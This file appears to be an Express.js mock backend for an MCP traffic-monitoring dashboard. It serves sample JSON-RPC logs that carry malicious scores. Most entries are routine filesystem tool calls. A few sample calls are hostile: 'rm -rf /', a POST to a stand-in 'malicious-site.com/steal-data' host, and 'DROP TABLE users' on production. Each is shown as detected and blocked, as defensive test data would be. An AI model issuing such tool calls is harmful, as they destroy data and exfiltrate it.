const express = require('express')
const cors = require('cors')

const app = express()
const PORT = 3001

app.use(cors())
app.use(express.json())

// Mock data for MCP Servers
const mcpServers = [
  {
    id: 1,
    name: 'filesystem',
    icon: '📁',
    type: 'local',
    tools: [
      {
        name: 'read_file',
        description: 'Read the complete contents of a file as text. DEPRECATED: Use read_text_file instead.'
      },
      {
        name: 'read_text_file',
        description: 'Read the complete contents of a file from the file system as text. Handles various text file encodings and formats the content in a parsable way.'
      },
      {
        name: 'read_media_file',
        description: 'Read an image or audio file. Returns the base64 encoded data and MIME type.'
      },
      {
        name: 'file_search',
        description: 'Search for files using semantic and keyword-based search. Supports multiple search modes and filters.'
      }
    ]
  },
  {
    id: 2,
    name: 'mcp-server-1',
    icon: '🔧',
    type: 'remote',
    tools: [
      {
        name: 'execute_command',
        description: 'Execute system commands with specified parameters.'
      },
      {
        name: 'process_data',
        description: 'Process and transform data using various algorithms.'
      }
    ]
  },
  {
    id: 3,
    name: 'mcp-server-2',
    icon: '🌐',
    type: 'remote',
    tools: [
      {
        name: 'fetch_data',
        description: 'Fetch data from external APIs and web services.'
      },
      {
        name: 'send_request',
        description: 'Send HTTP requests to external endpoints.'
      }
    ]
  },
  {
    id: 4,
    name: 'mcp-server-3',
    icon: '💾',
    type: 'local',
    tools: [
      {
        name: 'database_query',
        description: 'Execute database queries and retrieve results.'
      },
      {
        name: 'cache_data',
        description: 'Store and retrieve data from cache systems.'
      }
    ]
  }
]

// Mock data for chat messages by server
const chatMessagesByServer = {
  1: [ // filesystem
    {
      id: 1,
      type: 'initialize',
      sender : "client",
      timestamp: '2025-02-16 10:23:15 KST',
      maliciousScore: 0,
      data: {
        message: {
          method: 'initialize',
          params: {
            protocolVersion: '2025-06-18',
            capabilities: {},
            clientInfo: {
              name: 'claude-ai',
              version: '0.1.0'
            }
          },
          jsonrpc: '2.0',
          id: 0
        }
      }
    },
    {
      id: 2,
      type: 'initialize_response',
      sender : "server",
      timestamp: '2025-02-16 10:23:16 KST',
      maliciousScore: 0,
      data: {
        message: {
          result: {
            protocolVersion: '2025-06-18',
            capabilities: {
              tools: {}
            },
            serverInfo: {
              name: 'secure-filesystem-server',
              version: '0.2.0'
            }
          },
          jsonrpc: '2.0',
          id: 0
        }
      }
    },
    {
      id: 3,
      type: 'notifications/initialized',
      sender : "client",
      timestamp: '2025-02-17 09:15:22 KST',
      maliciousScore: 0,
      data: {
        message: {
          method: 'notifications/initialized',
          jsonrpc: '2.0'
        }
      }
    },
    {
      id: 4,
      type: 'tools/list_call',
      sender : "client",
      timestamp: '2025-02-17 09:15:23 KST',
      maliciousScore: 0,
      data: {
        message: {
          method: 'tools/list',
          params: {},
          jsonrpc: '2.0',
          id: 1
        }
      }
    },
    {
      id: 5,
      type: 'tools/list_response',
      sender : "server",
      timestamp: '2025-02-17 09:15:24 KST',
      maliciousScore: 0,
      data: {
        "task": "RECV",
        "transPort": "stdio",
        "src": "server",
        "dst": "client",
        "message": {
          "result": {
            "tools": [
              {
                "name": "read_file",
                "description": "Read the complete contents of a file as text. DEPRECATED: Use read_text_file instead.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    },
                    "tail": {
                      "type": "number",
                      "description": "If provided, returns only the last N lines of the file"
                    },
                    "head": {
                      "type": "number",
                      "description": "If provided, returns only the first N lines of the file"
                    }
                  },
                  "required": [
                    "path"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "read_text_file",
                "description": "Read the complete contents of a file from the file system as text. Handles various text encodings and provides detailed error messages if the file cannot be read. Use this tool when you need to examine the contents of a single file. Use the 'head' parameter to read only the first N lines of a file, or the 'tail' parameter to read only the last N lines of a file. Operates on the file as text regardless of extension. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    },
                    "tail": {
                      "type": "number",
                      "description": "If provided, returns only the last N lines of the file"
                    },
                    "head": {
                      "type": "number",
                      "description": "If provided, returns only the first N lines of the file"
                    }
                  },
                  "required": [
                    "path"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "read_media_file",
                "description": "Read an image or audio file. Returns the base64 encoded data and MIME type. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    }
                  },
                  "required": [
                    "path"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "read_multiple_files",
                "description": "Read the contents of multiple files simultaneously. This is more efficient than reading files one by one when you need to analyze or compare multiple files. Each file's content is returned with its path as a reference. Failed reads for individual files won't stop the entire operation. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "paths": {
                      "type": "array",
                      "items": {
                        "type": "string"
                      }
                    }
                  },
                  "required": [
                    "paths"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "write_file",
                "description": "Create a new file or completely overwrite an existing file with new content. Use with caution as it will overwrite existing files without warning. Handles text content with proper encoding. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    },
                    "content": {
                      "type": "string"
                    }
                  },
                  "required": [
                    "path",
                    "content"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "edit_file",
                "description": "Make line-based edits to a text file. Each edit replaces exact line sequences with new content. Returns a git-style diff showing the changes made. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    },
                    "edits": {
                      "type": "array",
                      "items": {
                        "type": "object",
                        "properties": {
                          "oldText": {
                            "type": "string",
                            "description": "Text to search for - must match exactly"
                          },
                          "newText": {
                            "type": "string",
                            "description": "Text to replace with"
                          }
                        },
                        "required": [
                          "oldText",
                          "newText"
                        ],
                        "additionalProperties": false
                      }
                    },
                    "dryRun": {
                      "type": "boolean",
                      "default": false,
                      "description": "Preview changes using git-style diff format"
                    }
                  },
                  "required": [
                    "path",
                    "edits"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "create_directory",
                "description": "Create a new directory or ensure a directory exists. Can create multiple nested directories in one operation. If the directory already exists, this operation will succeed silently. Perfect for setting up directory structures for projects or ensuring required paths exist. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    }
                  },
                  "required": [
                    "path"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "list_directory",
                "description": "Get a detailed listing of all files and directories in a specified path. Results clearly distinguish between files and directories with [FILE] and [DIR] prefixes. This tool is essential for understanding directory structure and finding specific files within a directory. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    }
                  },
                  "required": [
                    "path"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "list_directory_with_sizes",
                "description": "Get a detailed listing of all files and directories in a specified path, including sizes. Results clearly distinguish between files and directories with [FILE] and [DIR] prefixes. This tool is useful for understanding directory structure and finding specific files within a directory. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    },
                    "sortBy": {
                      "type": "string",
                      "enum": [
                        "name",
                        "size"
                      ],
                      "default": "name",
                      "description": "Sort entries by name or size"
                    }
                  },
                  "required": [
                    "path"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "directory_tree",
                "description": "Get a recursive tree view of files and directories as a JSON structure. Each entry includes 'name', 'type' (file/directory), and 'children' for directories. Files have no children array, while directories always have a children array (which may be empty). The output is formatted with 2-space indentation for readability. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    }
                  },
                  "required": [
                    "path"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "move_file",
                "description": "Move or rename files and directories. Can move files between directories and rename them in a single operation. If the destination exists, the operation will fail. Works across different directories and can be used for simple renaming within the same directory. Both source and destination must be within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "source": {
                      "type": "string"
                    },
                    "destination": {
                      "type": "string"
                    }
                  },
                  "required": [
                    "source",
                    "destination"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "search_files",
                "description": "Recursively search for files and directories matching a pattern. Searches through all subdirectories from the starting path. The search is case-insensitive and matches partial names. Returns full paths to all matching items. Great for finding files when you don't know their exact location. Only searches within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    },
                    "pattern": {
                      "type": "string"
                    },
                    "excludePatterns": {
                      "type": "array",
                      "items": {
                        "type": "string"
                      },
                      "default": []
                    }
                  },
                  "required": [
                    "path",
                    "pattern"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "get_file_info",
                "description": "Retrieve detailed metadata about a file or directory. Returns comprehensive information including size, creation time, last modified time, permissions, and type. This tool is perfect for understanding file characteristics without reading the actual content. Only works within allowed directories.",
                "inputSchema": {
                  "type": "object",
                  "properties": {
                    "path": {
                      "type": "string"
                    }
                  },
                  "required": [
                    "path"
                  ],
                  "additionalProperties": false,
                  "$schema": "http://json-schema.org/draft-07/schema#"
                }
              },
              {
                "name": "list_allowed_directories",
                "description": "Returns the list of directories that this server is allowed to access. Subdirectories within these allowed directories are also accessible. Use this to understand which directories and their nested paths are available before trying to access files.",
                "inputSchema": {
                  "type": "object",
                  "properties": {},
                  "required": []
                }
              }
            ]
          },
          "jsonrpc": "2.0",
          "id": 1
        }
      }
    },
    {
      id: 6,
      type: 'tools/call',
      sender : "client",
      timestamp: '2025-02-17 09:20:31 KST',
      maliciousScore: 0,
      data: {
        "message": {
          "method": "tools/call",
          "params": {
            "name": "list_allowed_directories",
            "arguments": {}
          },
          "jsonrpc": "2.0",
          "id": 4
        }
      }
    },
    {
      id: 7,
      type: 'tools/response',
      sender : "server",
      timestamp: '2025-02-17 09:20:32 KST',
      maliciousScore: 0,
      data: {
        "message": {
          "result": {
            "content": [
              {
                "type": "text",
                "text": "Allowed directories:\nC:\\Users\\jeong\\OneDrive\\Desktop\\bob"
              }
            ]
          },
          "jsonrpc": "2.0",
          "id": 4
        }
      }
    },
    {
      id: 8,
      type: 'tools/call',
      sender : "client",
      timestamp: '2025-02-17 09:25:45 KST',
      maliciousScore: 0,
      data: {
        "message": {
          "method": "tools/call",
          "params": {
            "name": "write_file",
            "arguments": {
              "path": "C:\\Users\\jeong\\OneDrive\\Desktop\\bob\\82ch.txt",
              "content": "hello world"
            }
          },
          "jsonrpc": "2.0",
          "id": 5
        }
      }
    },
    {
      id: 9,
      type: 'tools/response',
      sender : "server",
      timestamp: '2025-02-17 09:25:46 KST',
      maliciousScore: 0,
      data: {
        "message": {
          "result": {
            "content": [
              {
                "type": "text",
                "text": "Successfully wrote to C:\\Users\\jeong\\OneDrive\\Desktop\\bob\\82ch.txt"
              }
            ]
          },
          "jsonrpc": "2.0",
          "id": 5
        }
      }
    }
  ],
  2: [ // mcp-server-1
    {
      id: 1,
      type: 'initialize',
      sender: "client",
      timestamp: '2025-02-18 11:30:10 KST',
      maliciousScore: 0,
      data: {
        message: {
          method: 'initialize',
          params: {
            protocolVersion: '2025-06-18',
            capabilities: {},
            clientInfo: {
              name: 'mcp-client',
              version: '1.0.0'
            }
          },
          jsonrpc: '2.0',
          id: 0
        }
      }
    },
    {
      id: 2,
      type: 'tools/call',
      sender: "client",
      timestamp: '2025-02-18 11:35:22 KST',
      maliciousScore: 5,
      data: {
        message: {
          method: 'tools/call',
          params: {
            name: 'execute_command',
            arguments: {
              command: 'rm -rf /',
              options: '--force'
            }
          },
          jsonrpc: '2.0',
          id: 1
        }
      }
    },
    {
      id: 3,
      type: 'tools/response',
      sender: "server",
      timestamp: '2025-02-18 11:35:23 KST',
      maliciousScore: 0,
      data: {
        message: {
          result: {
            content: [
              {
                type: "text",
                text: "Command blocked: Dangerous operation detected"
              }
            ]
          },
          jsonrpc: '2.0',
          id: 1
        }
      }
    }
  ],
  3: [ // mcp-server-2
    {
      id: 1,
      type: 'initialize',
      sender: "client",
      timestamp: '2025-02-19 14:20:05 KST',
      maliciousScore: 0,
      data: {
        message: {
          method: 'initialize',
          params: {
            protocolVersion: '2025-06-18',
            capabilities: {},
            clientInfo: {
              name: 'web-client',
              version: '2.0.0'
            }
          },
          jsonrpc: '2.0',
          id: 0
        }
      }
    },
    {
      id: 2,
      type: 'tools/call',
      sender: "client",
      timestamp: '2025-02-19 14:25:18 KST',
      maliciousScore: 8,
      data: {
        message: {
          method: 'tools/call',
          params: {
            name: 'fetch_data',
            arguments: {
              url: 'http://malicious-site.com/steal-data',
              method: 'POST'
            }
          },
          jsonrpc: '2.0',
          id: 1
        }
      }
    },
    {
      id: 3,
      type: 'tools/response',
      sender: "server",
      timestamp: '2025-02-19 14:25:19 KST',
      maliciousScore: 0,
      data: {
        message: {
          error: {
            code: -32000,
            message: "URL blocked: Suspicious domain detected"
          },
          jsonrpc: '2.0',
          id: 1
        }
      }
    },
    {
      id: 4,
      type: 'tools/call',
      sender: "client",
      timestamp: '2025-02-19 14:30:42 KST',
      maliciousScore: 1,
      data: {
        message: {
          method: 'tools/call',
          params: {
            name: 'send_request',
            arguments: {
              url: 'https://api.example.com/data',
              method: 'GET'
            }
          },
          jsonrpc: '2.0',
          id: 2
        }
      }
    }
  ],
  4: [ // mcp-server-3
    {
      id: 1,
      type: 'initialize',
      sender: "client",
      timestamp: '2025-02-20 16:45:12 KST',
      maliciousScore: 0,
      data: {
        message: {
          method: 'initialize',
          params: {
            protocolVersion: '2025-06-18',
            capabilities: {},
            clientInfo: {
              name: 'db-client',
              version: '1.5.0'
            }
          },
          jsonrpc: '2.0',
          id: 0
        }
      }
    },
    {
      id: 2,
      type: 'tools/call',
      sender: "client",
      timestamp: '2025-02-20 16:50:33 KST',
      maliciousScore: 9,
      data: {
        message: {
          method: 'tools/call',
          params: {
            name: 'database_query',
            arguments: {
              query: 'DROP TABLE users; --',
              database: 'production'
            }
          },
          jsonrpc: '2.0',
          id: 1
        }
      }
    },
    {
      id: 3,
      type: 'tools/response',
      sender: "server",
      timestamp: '2025-02-20 16:50:34 KST',
      maliciousScore: 0,
      data: {
        message: {
          error: {
            code: -32001,
            message: "SQL injection attempt detected and blocked"
          },
          jsonrpc: '2.0',
          id: 1
        }
      }
    },
    {
      id: 4,
      type: 'tools/call',
      sender: "client",
      timestamp: '2025-02-20 16:55:47 KST',
      maliciousScore: 0,
      data: {
        message: {
          method: 'tools/call',
          params: {
            name: 'cache_data',
            arguments: {
              key: 'user_session',
              value: 'session_token_12345'
            }
          },
          jsonrpc: '2.0',
          id: 2
        }
      }
    },
    {
      id: 5,
      type: 'tools/response',
      sender: "server",
      timestamp: '2025-02-20 16:55:48 KST',
      maliciousScore: 0,
      data: {
        message: {
          result: {
            content: [
              {
                type: "text",
                text: "Data cached successfully"
              }
            ]
          },
          jsonrpc: '2.0',
          id: 2
        }
      }
    }
  ]
}

// API Routes

// Get all MCP servers
app.get('/api/servers', (req, res) => {
  res.json(mcpServers)
})

// Get server by ID
app.get('/api/servers/:id', (req, res) => {
  const serverId = parseInt(req.params.id)
  const server = mcpServers.find(s => s.id === serverId)

  if (server) {
    res.json(server)
  } else {
    res.status(404).json({ error: 'Server not found' })
  }
})

// Get messages for a specific server
app.get('/api/servers/:id/messages', (req, res) => {
  const serverId = parseInt(req.params.id)
  const messages = chatMessagesByServer[serverId] || []

  res.json(messages)
})

// Get all messages (for all servers)
app.get('/api/messages', (req, res) => {
  res.json(chatMessagesByServer)
})

app.listen(PORT, () => {
  console.log(`Backend server running on http://localhost:${PORT}`)
})
